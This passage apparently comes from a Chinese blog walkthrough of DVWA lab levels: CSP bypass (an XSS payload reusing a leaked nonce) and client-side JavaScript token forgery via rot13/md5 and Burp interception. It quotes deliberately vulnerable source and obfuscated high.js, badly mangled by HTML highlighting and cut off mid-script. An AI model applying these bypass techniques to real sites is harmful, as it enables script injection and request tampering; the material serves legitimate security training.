class="string">"</span>;</span><br><span class="line">&#125;</span><br><span class="line">$page[ <span class="string">'body'</span> ] .= <span class="string">'</span></span><br><span class="line"><span class="string">&lt;form name="csp" method="POST"&gt;</span></span><br><span class="line"><span class="string">    &lt;p&gt;Whatever you enter here gets dropped directly into the page, see if you can get an alert box to pop up.&lt;/p&gt;</span></span><br><span class="line"><span class="string">    &lt;input size="50" type="text" name="include" value="" id="include" /&gt;</span></span><br><span class="line"><span class="string">    &lt;input type="submit" value="Include" /&gt;</span></span><br><span class="line"><span class="string">&lt;/form&gt;</span></span><br><span class="line"><span class="string">'</span>;</span><br></pre></td></tr></table></figure>

<p>主要是在http头信息中的script-src的合法来源发生了变化</p>
<ul>
<li><p>unsafe-inline，允许使用内联资源，如内联<code>&lt;script&gt;</code>元素，javascript；URL，内联事件处理程序（如onclick）和内联<code>&lt;style&gt;</code>元素，必须包括单引号。</p>
</li>
<li><p>nonce-source，仅允许特定的内联脚本块</p>
<p>nonce=TmV2ZXIgZ29pbmcgdG8gZ2l2ZSB5b3UgdXA</p>
</li>
</ul>
<p>知道这些就可以直接将以下代码进行注入：</p>
<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">nonce</span>=<span class="string">"TmV2ZXIgZ29pbmcgdG8gZ2l2ZSB5b3UgdXA="</span>&gt;</span><span class="javascript">alert(<span class="regexp">/hahaha/</span>)</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p><img src="/2020/06/29/DVWA%E5%85%B3%E5%8D%A1%E7%BA%AA%E5%BD%95/91.png" alt></p>
<p>但是这种方式需要提前知道nonce。</p>
<h3 id="High-12"><a href="#High-12" class="headerlink" title="High"></a>High</h3><p>服务器端源码</p>
<p>PHP</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$headerCSP = <span class="string">"Content-Security-Policy: script-src 'self';"</span>;</span><br><span class="line"></span><br><span class="line">header($headerCSP);</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span> ($_POST[<span class="string">'include'</span>])) &#123;</span><br><span class="line">$page[ <span class="string">'body'</span> ] .= <span class="string">"</span></span><br><span class="line"><span class="string">    "</span> . $_POST[<span class="string">'include'</span>] . <span class="string">"</span></span><br><span class="line"><span class="string">"</span>;</span><br><span class="line">&#125;</span><br><span class="line">$page[ <span class="string">'body'</span> ] .= <span class="string">'</span></span><br><span class="line"><span class="string">&lt;form name="csp" method="POST"&gt;</span></span><br><span class="line"><span class="string">    &lt;p&gt;The page makes a call to '</span> . DVWA_WEB_PAGE_TO_ROOT . <span class="string">'/vulnerabilities/csp/source/jsonp.php to load some code. Modify that page to run your own code.&lt;/p&gt;</span></span><br><span class="line"><span class="string">    &lt;p&gt;1+2+3+4+5=&lt;span id="answer"&gt;&lt;/span&gt;&lt;/p&gt;</span></span><br><span class="line"><span class="string">    &lt;input type="button" id="solve" value="Solve the sum" /&gt;</span></span><br><span class="line"><span class="string">&lt;/form&gt;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">&lt;script src="source/high.js"&gt;&lt;/script&gt;</span></span><br><span class="line"><span class="string">'</span>;</span><br></pre></td></tr></table></figure>

<p>JavaScript</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">clickButton</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">    <span class="keyword">var</span> s = <span class="built_in">document</span>.createElement(<span class="string">"script"</span>);</span><br><span class="line">    s.src = <span class="string">"source/jsonp.php?callback=solveSum"</span>;</span><br><span class="line">    <span class="built_in">document</span>.body.appendChild(s);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">solveSum</span>(<span class="params">obj</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="string">"answer"</span> <span class="keyword">in</span> obj) &#123;</span><br><span class="line">        <span class="built_in">document</span>.getElementById(<span class="string">"answer"</span>).innerHTML = obj[<span class="string">'answer'</span>];</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> solve_button = <span class="built_in">document</span>.getElementById (<span class="string">"solve"</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (solve_button) &#123;</span><br><span class="line">    solve_button.addEventListener(<span class="string">"click"</span>, <span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        clickButton();</span><br><span class="line">    &#125;);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>在该级别中，CSP头设置了只允许自身加载JS（script-src ‘self’)</p>
<h2 id="JavaScript"><a href="#JavaScript" class="headerlink" title="JavaScript"></a>JavaScript</h2><p>在该模块就是你能提交success这个词，成功现实就是ok了。</p>
<h3 id="Low-13"><a href="#Low-13" class="headerlink" title="Low"></a>Low</h3><p>直接在前端改成success，提交发现是不对的</p>
<p><img src="/2020/06/29/DVWA%E5%85%B3%E5%8D%A1%E7%BA%AA%E5%BD%95/92.png" alt></p>
<p>F12查看源码情况</p>
<p><img src="/2020/06/29/DVWA%E5%85%B3%E5%8D%A1%E7%BA%AA%E5%BD%95/93.png" alt></p>
<p><img src="/2020/06/29/DVWA%E5%85%B3%E5%8D%A1%E7%BA%AA%E5%BD%95/94.png" alt></p>
<p>可以看到这个是token，不是后台生成的，而是在前台生成的token，是前台生成的token是用md5（”ChangeMe”），而后台期待的是md5是md5（”success”）</p>
<p>通过源码发现获取token的函数是generate_token()，函数内主要是md5()和rot13()函数进行加密，拆解加密过程使用线上加密工具,现将success字符串进行rot13加密</p>
<p><img src="/2020/06/29/DVWA%E5%85%B3%E5%8D%A1%E7%BA%AA%E5%BD%95/95.png" alt></p>
<p>将获取到的加密字符串进行md5加密，并选择32位小写</p>
<p><img src="/2020/06/29/DVWA%E5%85%B3%E5%8D%A1%E7%BA%AA%E5%BD%95/96.png" alt></p>
<p>用burpsuite拦截提交报文，并更改相关参数</p>
<p><img src="/2020/06/29/DVWA%E5%85%B3%E5%8D%A1%E7%BA%AA%E5%BD%95/97.png" alt></p>
<p>结果如下：</p>
<p><img src="/2020/06/29/DVWA%E5%85%B3%E5%8D%A1%E7%BA%AA%E5%BD%95/98.png" alt></p>
<h3 id="Medium-13"><a href="#Medium-13" class="headerlink" title="Medium"></a>Medium</h3><p>服务器端源码</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">	$page[ <span class="string">'body'</span> ] .= <span class="string">'&lt;script src="'</span> . DVWA_WEB_PAGE_TO_ROOT . <span class="string">'vulnerabilities/javascript/source/medium.js"&gt;&lt;/script&gt;'</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>后端获取token的JS源码</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">do_something</span>(<span class="params">e</span>)</span>&#123;</span><br><span class="line">	<span class="keyword">for</span>(<span class="keyword">var</span> t=<span class="string">""</span>,n=e.length<span class="number">-1</span>;n&gt;=<span class="number">0</span>;n--)</span><br><span class="line">		t+=e[n];</span><br><span class="line">	<span class="keyword">return</span> t</span><br><span class="line">&#125;</span><br><span class="line">setTimeout(<span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;do_elsesomething(<span class="string">"XX"</span>)&#125;,<span class="number">300</span>);</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">do_elsesomething</span>(<span class="params">e</span>)</span>&#123;</span><br><span class="line">	<span class="built_in">document</span>.getElementById(<span class="string">"token"</span>).value=do_something(e+<span class="built_in">document</span>.getElementById(<span class="string">"phrase"</span>).value+<span class="string">"XX"</span>)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>通过查看JS代码逻辑，发现token是由do_something(e+document.getElementById(“phrase”).value+”XX”)产生，通过重新构建代码并访问得到相关的token</p>
<figure class="highlight excel"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">function do_something(e)&#123;</span><br><span class="line">	for(<span class="built_in">var</span> <span class="built_in">t</span>=<span class="string">""</span>,<span class="built_in">n</span>=e.length-<span class="number">1</span>;<span class="built_in">n</span>&gt;=<span class="number">0</span>;<span class="built_in">n</span>--)<span class="built_in">t</span>+=e[<span class="built_in">n</span>];</span><br><span class="line">	return <span class="built_in">t</span></span><br><span class="line">&#125;</span><br><span class="line">alert(do_something(<span class="string">"XX"</span>+'success'+<span class="string">"XX"</span>));</span><br></pre></td></tr></table></figure>

<p>获取到token后使用bp进行拦截报文并将相关的参数进行修改即可。</p>
<h3 id="High-13"><a href="#High-13" class="headerlink" title="High"></a>High</h3><p>服务器端源码</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$page[ <span class="string">'body'</span> ] .= <span class="string">'&lt;script src="'</span> . DVWA_WEB_PAGE_TO_ROOT . <span class="string">'vulnerabilities/javascript/source/high.js"&gt;&lt;/script&gt;'</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>后端JS源码</p>
<figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">var a=[<span class="string">'fromCharCode','toString','replace','BeJ','\x5cw+','Lyg','SuR','(w()&#123;\x273M\x203L\x27;q\x201l=\x273K\x203I\x203J\x20T\x27;q\x201R=1c\x202I===\x271n\x27;q\x20Y=1R?2I:&#123;&#125;;p(Y.3N)&#123;1R=1O&#125;q\x202L=!1R&amp;&amp;1c\x202M===\x271n\x27;q\x202o=!Y.2S&amp;&amp;1c\x202d===\x271n\x27&amp;&amp;2d.2Q&amp;&amp;2d.2Q.3S;p(2o)&#123;Y=3R&#125;z\x20p(2L)&#123;Y=2M&#125;q\x202G=!Y.3Q&amp;&amp;1c\x202g===\x271n\x27&amp;&amp;2g.X;q\x202s=1c\x202l===\x27w\x27&amp;&amp;2l.3P;q\x201y=!Y.3H&amp;&amp;1c\x20Z!==\x272T\x27;q\x20m=\x273G\x27.3z(\x27\x27);q\x202w=[-3y,3x,3v,3w</span>];q\x20U=[<span class="string">24,16,8,0</span>];q\x20K=[<span class="string">3A,3B,3F,3E,3D,3C,3T,3U,4d,4c,4b,49,4a,4e,4f,4j,4i,4h,3u,48,47,3Z,3Y,3X,3V,3W,40,41,46,45,43,42,4k,3f,38,36,39,37,34,33,2Y,31,2Z,35,3t,3n,3m,3l,3o,3p,3s,3r,3q,3k,3j,3d,3a,3c,3b,3e,3h,3g,3i,4g</span>];q\x201E=[<span class="string">\x271e\x27,\x2727\x27,\x271G\x27,\x272R\x27</span>];q\x20l=[<span class="string"></span>];p(Y.2S||!1z.1K)&#123;1z.1K=w(1x)&#123;A\x204C.Q.2U.1I(1x)===\x27[<span class="string">1n\x201z</span>]\x27&#125;&#125;p(1y&amp;&amp;(Y.50||!Z.1N))&#123;Z.1N=w(1x)&#123;A\x201c\x201x===\x271n\x27&amp;&amp;1x.1w&amp;&amp;1x.1w.1J===Z&#125;&#125;q\x202m=w(1X,x)&#123;A\x20w(s)&#123;A\x20O\x20N(x,1d).S(s)[<span class="string">1X</span>](<span class="link"></span>)&#125;&#125;;q\x202a=w(x)&#123;q\x20P=2m(\x271e\x27,x);p(2o)&#123;P=2P(P,x)&#125;P.1T=w()&#123;A\x20O\x20N(x)&#125;;P.S=w(s)&#123;A\x20P.1T().S(s)&#125;;1g(q\x20i=0;i<span class="xml"><span class="tag">&lt;<span class="name">1E.W;++i)&#123;q\x20T=1E[i];P[T]=2m(T,x)&#125;A\x20P&#125;;q\x202P=w(P,x)&#123;q\x201S=2O(\x222N(\x271S\x27)\x22);q\x201Y=2O(\x222N(\x271w\x27).1Y\x22);q\x202n=x?\x271H\x27:\x271q\x27;q\x202z=w(s)&#123;p(1c\x20s===\x272p\x27)&#123;A\x201S.2x(2n).S(s,\x274S\x27).1G(\x271e\x27)&#125;z&#123;p(s===2q||s===2T)&#123;1u\x20O\x201t(1l)&#125;z\x20p(s.1J===Z)&#123;s=O\x202r(s)&#125;&#125;p(1z.1K(s)||Z.1N(s)||s.1J===1Y)&#123;A\x201S.2x(2n).S(O\x201Y(s)).1G(\x271e\x27)&#125;z&#123;A\x20P(s)&#125;&#125;;A\x202z&#125;;q\x202k=w(1X,x)&#123;A\x20w(G,s)&#123;A\x20O\x201P(G,x,1d).S(s)[1X]()&#125;&#125;;q\x202f=w(x)&#123;q\x20P=2k(\x271e\x27,x);P.1T=w(G)&#123;A\x20O\x201P(G,x)&#125;;P.S=w(G,s)&#123;A\x20P.1T(G).S(s)&#125;;1g(q\x20i=0;i</span>&lt;<span class="attr">1E.W</span>;++<span class="attr">i</span>)&#123;<span class="attr">q</span>\<span class="attr">x20T</span>=<span class="string">1E[i];P[T]</span>=<span class="string">2k(T,x)&#125;A\x20P&#125;;w\x20N(x,1v)&#123;p(1v)&#123;l[0]</span>=<span class="string">l[16]</span>=<span class="string">l[1]</span>=<span class="string">l[2]</span>=<span class="string">l[3]</span>=<span class="string">l[4]</span>=<span class="string">l[5]</span>=<span class="string">l[6]</span>=<span class="string">l[7]</span>=<span class="string">l[8]</span>=<span class="string">l[9]</span>=<span class="string">l[10]</span>=<span class="string">l[11]</span>=<span class="string">l[12]</span>=<span class="string">l[13]</span>=<span class="string">l[14]</span>=<span class="string">l[15]</span>=<span class="string">0;k.l</span>=<span class="string">l&#125;z&#123;k.l</span>=<span class="string">[0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0]&#125;p(x)&#123;k.C</span>=<span class="string">4I;k.B</span>=<span class="string">4H;k.E</span>=<span class="string">4l;k.F</span>=<span class="string">4U;k.J</span>=<span class="string">4J;k.I</span>=<span class="string">4K;k.H</span>=<span class="string">4L;k.D</span>=<span class="string">4T&#125;z&#123;k.C</span>=<span class="string">4X;k.B</span>=<span class="string">4W;k.E</span>=<span class="string">4Y;k.F</span>=<span class="string">4Z;k.J</span>=<span class="string">4V;k.I</span>=<span class="string">4O;k.H</span>=<span class="string">4F;k.D</span>=<span class="string">4s&#125;k.1C</span>=<span class="string">k.1A</span>=<span class="string">k.L</span>=<span class="string">k.2i</span>=<span class="string">0;k.1U</span>=<span class="string">k.1L</span>=<span class="string">1O;k.2j</span>=<span class="string">1d;k.x</span>=<span class="string">x&#125;N.Q.S</span>=<span class="string">w(s)&#123;p(k.1U)&#123;A&#125;q\x202h,T</span>=<span class="string">1c\x20s;p(T!</span>==<span class="string">\x272p\x27)&#123;p(T</span>===<span class="string">\x271n\x27)&#123;p(s</span>===<span class="string">2q)&#123;1u\x20O\x201t(1l)&#125;z\x20p(1y&amp;&amp;s.1J</span>===<span class="string">Z)&#123;s</span>=<span class="string">O\x202r(s)&#125;z\x20p(!1z.1K(s))&#123;p(!1y||!Z.1N(s))&#123;1u\x20O\x201t(1l)&#125;&#125;&#125;z&#123;1u\x20O\x201t(1l)&#125;2h</span>=<span class="string">1d&#125;q\x20r,M</span>=<span class="string">0,i,W</span>=<span class="string">s.W,l</span>=<span class="string">k.l;4t(M</span>&lt;<span class="attr">W</span>)&#123;<span class="attr">p</span>(<span class="attr">k.1L</span>)&#123;<span class="attr">k.1L</span>=<span class="string">1O;l[0]</span>=<span class="string">k.1C;l[16]</span>=<span class="string">l[1]</span>=<span class="string">l[2]</span>=<span class="string">l[3]</span>=<span class="string">l[4]</span>=<span class="string">l[5]</span>=<span class="string">l[6]</span>=<span class="string">l[7]</span>=<span class="string">l[8]</span>=<span class="string">l[9]</span>=<span class="string">l[10]</span>=<span class="string">l[11]</span>=<span class="string">l[12]</span>=<span class="string">l[13]</span>=<span class="string">l[14]</span>=<span class="string">l[15]</span>=<span class="string">0&#125;p(2h)&#123;1g(i</span>=<span class="string">k.1A;M</span>&lt;<span class="attr">W</span>&amp;&amp;<span class="attr">i</span>&lt;<span class="attr">1k</span>;++<span class="attr">M</span>)&#123;<span class="attr">l</span>[<span class="attr">i</span>&gt;</span></span>&gt;2]|=s[<span class="string">M</span>]<span class="xml"><span class="tag">&lt;&lt;<span class="attr">U</span>[<span class="attr">i</span>++&amp;<span class="attr">3</span>]&#125;&#125;<span class="attr">z</span>&#123;<span class="attr">1g</span>(<span class="attr">i</span>=<span class="string">k.1A;M</span>&lt;<span class="attr">W</span>&amp;&amp;<span class="attr">i</span>&lt;<span class="attr">1k</span>;++<span class="attr">M</span>)&#123;<span class="attr">r</span>=<span class="string">s.1Q(M);p(r</span>&lt;<span class="attr">R</span>)&#123;<span class="attr">l</span>[<span class="attr">i</span>&gt;</span></span>&gt;2]|=r<span class="xml"><span class="tag">&lt;&lt;<span class="attr">U</span>[<span class="attr">i</span>++&amp;<span class="attr">3</span>]&#125;<span class="attr">z</span>\<span class="attr">x20p</span>(<span class="attr">r</span>&lt;<span class="attr">2v</span>)&#123;<span class="attr">l</span>[<span class="attr">i</span>&gt;</span></span>&gt;2]|=(2t|(r&gt;&gt;6))<span class="xml"><span class="tag">&lt;&lt;<span class="attr">U</span>[<span class="attr">i</span>++&amp;<span class="attr">3</span>];<span class="attr">l</span>[<span class="attr">i</span>&gt;</span></span>&gt;2]|=(R|(r&amp;V))<span class="xml"><span class="tag">&lt;&lt;<span class="attr">U</span>[<span class="attr">i</span>++&amp;<span class="attr">3</span>]&#125;<span class="attr">z</span>\<span class="attr">x20p</span>(<span class="attr">r</span>&lt;<span class="attr">2A</span>||<span class="attr">r</span>&gt;</span></span>=2E)&#123;l[<span class="string">i&gt;&gt;2</span>]|=(2D|(r&gt;&gt;12))<span class="xml"><span class="tag">&lt;&lt;<span class="attr">U</span>[<span class="attr">i</span>++&amp;<span class="attr">3</span>];<span class="attr">l</span>[<span class="attr">i</span>&gt;</span></span>&gt;2]|=(R|((r&gt;&gt;6)&amp;V))<span class="xml"><span class="tag">&lt;&lt;<span class="attr">U</span>[<span class="attr">i</span>++&amp;<span class="attr">3</span>];<span class="attr">l</span>[<span class="attr">i</span>&gt;</span></span>&gt;2]|=(R|(r&amp;V))<span class="xml"><span class="tag">&lt;&lt;<span class="attr">U</span>[<span class="attr">i</span>++&amp;<span class="attr">3</span>]&#125;<span class="attr">z</span>&#123;<span class="attr">r</span>=<span class="string">2C+(((r&amp;23)</span>&lt;&lt;<span class="attr">10</span>)|(<span class="attr">s.1Q</span>(++<span class="attr">M</span>)&amp;<span class="attr">23</span>));<span class="attr">l</span>[<span class="attr">i</span>&gt;</span></span>&gt;2]|=(2X|(r&gt;&gt;18))<span class="xml"><span class="tag">&lt;&lt;<span class="attr">U</span>[<span class="attr">i</span>++&amp;<span class="attr">3</span>];<span class="attr">l</span>[<span class="attr">i</span>&gt;</span></span>&gt;2]|=(R|((r&gt;&gt;12)&amp;V))<span class="xml"><span class="tag">&lt;&lt;<span class="attr">U</span>[<span class="attr">i</span>++&amp;<span class="attr">3</span>];<span class="attr">l</span>[<span class="attr">i</span>&gt;</span></span>&gt;2]|=(R|((r&gt;&gt;6)&amp;V))<span class="xml"><span class="tag">&lt;&lt;<span class="attr">U</span>[<span class="attr">i</span>++&amp;<span class="attr">3</span>];<span class="attr">l</span>[<span class="attr">i</span>&gt;</span></span>&gt;2]|=(R|(r&amp;V))<span class="xml"><span class="tag">&lt;&lt;<span class="attr">U</span>[<span class="attr">i</span>++&amp;<span class="attr">3</span>]&#125;&#125;&#125;<span class="attr">k.2u</span>=<span class="string">i;k.L+</span>=<span class="string">i-k.1A;p(i</span>&gt;</span></span>=1k)&#123;k.1C=l[<span class="string">16</span>];k.1A=i-1k;k.1W();k.1L=1d&#125;z&#123;k.1A=i&#125;&#125;p(k.L&gt;4r)&#123;k.2i+=k.L/2H<span class="xml"><span class="tag">&lt;&lt;<span class="attr">0</span>;<span class="attr">k.L</span>=<span class="string">k.L%2H&#125;A\x20k&#125;;N.Q.1s</span>=<span class="string">w()&#123;p(k.1U)&#123;A&#125;k.1U</span>=<span class="string">1d;q\x20l</span>=<span class="string">k.l,i</span>=<span class="string">k.2u;l[16]</span>=<span class="string">k.1C;l[i</span>&gt;</span></span>&gt;2]|=2w[<span class="string">i&amp;3</span>];k.1C=l[<span class="string">16</span>];p(i&gt;=4q)&#123;p(!k.1L)&#123;k.1W()&#125;l[<span class="string">0</span>]=k.1C;l[<span class="string">16</span>]=l[<span class="string">1</span>]=l[<span class="string">2</span>]=l[<span class="string">3</span>]=l[<span class="string">4</span>]=l[<span class="string">5</span>]=l[<span class="string">6</span>]=l[<span class="string">7</span>]=l[<span class="string">8</span>]=l[<span class="string">9</span>]=l[<span class="string">10</span>]=l[<span class="string">11</span>]=l[<span class="string">12</span>]=l[<span class="string">13</span>]=l[<span class="string">14</span>]=l[<span class="string">15</span>]=0&#125;l[<span class="string">14</span>]=k.2i<span class="xml"><span class="tag">&lt;&lt;<span class="attr">3</span>|<span class="attr">k.L</span>&gt;</span></span>&gt;&gt;29;l[<span class="string">15</span>]=k.L<span class="xml"><span class="tag">&lt;&lt;<span class="attr">3</span>;<span class="attr">k.1W</span>()&#125;;<span class="attr">N.Q.1W</span>=<span class="string">w()&#123;q\x20a</span>=<span class="string">k.C,b</span>=<span class="string">k.B,c</span>=<span class="string">k.E,d</span>=<span class="string">k.F,e</span>=<span class="string">k.J,f</span>=<span class="string">k.I,g</span>=<span class="string">k.H,h</span>=<span class="string">k.D,l</span>=<span class="string">k.l,j,1a,1b,1j,v,1f,1h,1B,1Z,1V,1D;1g(j</span>=<span class="string">16;j</span>&lt;<span class="attr">1k</span>;++<span class="attr">j</span>)&#123;<span class="attr">v</span>=<span class="string">l[j-15];1a</span>=<span class="string">((v</span>&gt;</span></span>&gt;&gt;7)|(v<span class="xml"><span class="tag">&lt;&lt;<span class="attr">25</span>))^((<span class="attr">v</span>&gt;</span></span>&gt;&gt;18)|(v<span class="xml"><span class="tag">&lt;&lt;<span class="attr">14</span>))^(<span class="attr">v</span>&gt;</span></span>&gt;&gt;3);v=l[<span class="string">j-2</span>];1b=((v&gt;&gt;&gt;17)|(v<span class="xml"><span class="tag">&lt;&lt;<span class="attr">15</span>))^((<span class="attr">v</span>&gt;</span></span>&gt;&gt;19)|(v<span class="xml"><span class="tag">&lt;&lt;<span class="attr">13</span>))^(<span class="attr">v</span>&gt;</span></span>&gt;&gt;10);l[<span class="string">j</span>]=l[<span class="string">j-16</span>]+1a+l[<span class="string">j-7</span>]+1b<span class="xml"><span class="tag">&lt;&lt;<span class="attr">0</span>&#125;<span class="attr">1D</span>=<span class="string">b&amp;c;1g(j</span>=<span class="string">0;j</span>&lt;<span class="attr">1k</span>;<span class="attr">j</span>+=<span class="string">4)&#123;p(k.2j)&#123;p(k.x)&#123;1B</span>=<span class="string">4m;v</span>=<span class="string">l[0]-4n;h</span>=<span class="string">v-4o</span>&lt;&lt;<span class="attr">0</span>;<span class="attr">d</span>=<span class="string">v+4p</span>&lt;&lt;<span class="attr">0</span>&#125;<span class="attr">z</span>&#123;<span class="attr">1B</span>=<span class="string">4v;v</span>=<span class="string">l[0]-4w;h</span>=<span class="string">v-4G</span>&lt;&lt;<span class="attr">0</span>;<span class="attr">d</span>=<span class="string">v+4D</span>&lt;&lt;<span class="attr">0</span>&#125;<span class="attr">k.2j</span>=<span class="string">1O&#125;z&#123;1a</span>=<span class="string">((a</span>&gt;</span></span>&gt;&gt;2)|(a<span class="xml"><span class="tag">&lt;&lt;<span class="attr">30</span>))^((<span class="attr">a</span>&gt;</span></span>&gt;&gt;13)|(a<span class="xml"><span class="tag">&lt;&lt;<span class="attr">19</span>))^((<span class="attr">a</span>&gt;</span></span>&gt;&gt;22)|(a<span class="xml"><span class="tag">&lt;&lt;<span class="attr">10</span>));<span class="attr">1b</span>=<span class="string">((e</span>&gt;</span></span>&gt;&gt;6)|(e<span class="xml"><span class="tag">&lt;&lt;<span class="attr">26</span>))^((<span class="attr">e</span>&gt;</span></span>&gt;&gt;11)|(e<span class="xml"><span class="tag">&lt;&lt;<span class="attr">21</span>))^((<span class="attr">e</span>&gt;</span></span>&gt;&gt;25)|(e<span class="xml"><span class="tag">&lt;&lt;<span class="attr">7</span>));<span class="attr">1B</span>=<span class="string">a&amp;b;1j</span>=<span class="string">1B^(a&amp;c)^1D;1h</span>=<span class="string">(e&amp;f)^(~e&amp;g);v</span>=<span class="string">h+1b+1h+K[j]+l[j];1f</span>=<span class="string">1a+1j;h</span>=<span class="string">d+v</span>&lt;&lt;<span class="attr">0</span>;<span class="attr">d</span>=<span class="string">v+1f</span>&lt;&lt;<span class="attr">0</span>&#125;<span class="attr">1a</span>=<span class="string">((d</span>&gt;</span></span>&gt;&gt;2)|(d<span class="xml"><span class="tag">&lt;&lt;<span class="attr">30</span>))^((<span class="attr">d</span>&gt;</span></span>&gt;&gt;13)|(d<span class="xml"><span class="tag">&lt;&lt;<span class="attr">19</span>))^((<span class="attr">d</span>&gt;</span></span>&gt;&gt;22)|(d<span class="xml"><span class="tag">&lt;&lt;<span class="attr">10</span>));<span class="attr">1b</span>=<span class="string">((h</span>&gt;</span></span>&gt;&gt;6)|(h<span class="xml"><span class="tag">&lt;&lt;<span class="attr">26</span>))^((<span class="attr">h</span>&gt;</span></span>&gt;&gt;11)|(h<span class="xml"><span class="tag">&lt;&lt;<span class="attr">21</span>))^((<span class="attr">h</span>&gt;</span></span>&gt;&gt;25)|(h<span class="xml"><span class="tag">&lt;&lt;<span class="attr">7</span>));<span class="attr">1Z</span>=<span class="string">d&amp;a;1j</span>=<span class="string">1Z^(d&amp;b)^1B;1h</span>=<span class="string">(h&amp;e)^(~h&amp;f);v</span>=<span class="string">g+1b+1h+K[j+1]+l[j+1];1f</span>=<span class="string">1a+1j;g</span>=<span class="string">c+v</span>&lt;&lt;<span class="attr">0</span>;<span class="attr">c</span>=<span class="string">v+1f</span>&lt;&lt;<span class="attr">0</span>;<span class="attr">1a</span>=<span class="string">((c</span>&gt;</span></span>&gt;&gt;2)|(c<span class="xml"><span class="tag">&lt;&lt;<span class="attr">30</span>))^((<span class="attr">c</span>&gt;</span></span>&gt;&gt;13)|(c<span class="xml"><span class="tag">&lt;&lt;<span class="attr">19</span>))^((<span class="attr">c</span>&gt;</span></span>&gt;&gt;22)|(c<span class="xml"><span class="tag">&lt;&lt;<span class="attr">10</span>));<span class="attr">1b</span>=<span class="string">((g</span>&gt;</span></span>&gt;&gt;6)|(g<span class="xml"><span class="tag">&lt;&lt;<span class="attr">26</span>))^((<span class="attr">g</span>&gt;</span></span>&gt;&gt;11)|(g<span class="xml"><span class="tag">&lt;&lt;<span class="attr">21</span>))^((<span class="attr">g</span>&gt;</span></span>&gt;&gt;25)|(g<span class="xml"><span class="tag">&lt;&lt;<span class="attr">7</span>));<span class="attr">1V</span>=<span class="string">c&amp;d;1j</span>=<span class="string">1V^(c&amp;a)^1Z;1h</span>=<span class="string">(g&amp;h)^(~g&amp;e);v</span>=<span class="string">f+1b+1h+K[j+2]+l[j+2];1f</span>=<span class="string">1a+1j;f</span>=<span class="string">b+v</span>&lt;&lt;<span class="attr">0</span>;<span class="attr">b</span>=<span class="string">v+1f</span>&lt;&lt;<span class="attr">0</span>;<span class="attr">1a</span>=<span class="string">((b</span>&gt;</span></span>&gt;&gt;2)|(b<span class="xml"><span class="tag">&lt;&lt;<span class="attr">30</span>))^((<span class="attr">b</span>&gt;</span></span>&gt;&gt;13)|(b<span class="xml"><span class="tag">&lt;&lt;<span class="attr">19</span>))^((<span class="attr">b</span>&gt;</span></span>&gt;&gt;22)|(b<span class="xml"><span class="tag">&lt;&lt;<span class="attr">10</span>));<span class="attr">1b</span>=<span class="string">((f</span>&gt;</span></span>&gt;&gt;6)|(f<span class="xml"><span class="tag">&lt;&lt;<span class="attr">26</span>))^((<span class="attr">f</span>&gt;</span></span>&gt;&gt;11)|(f<span class="xml"><span class="tag">&lt;&lt;<span class="attr">21</span>))^((<span 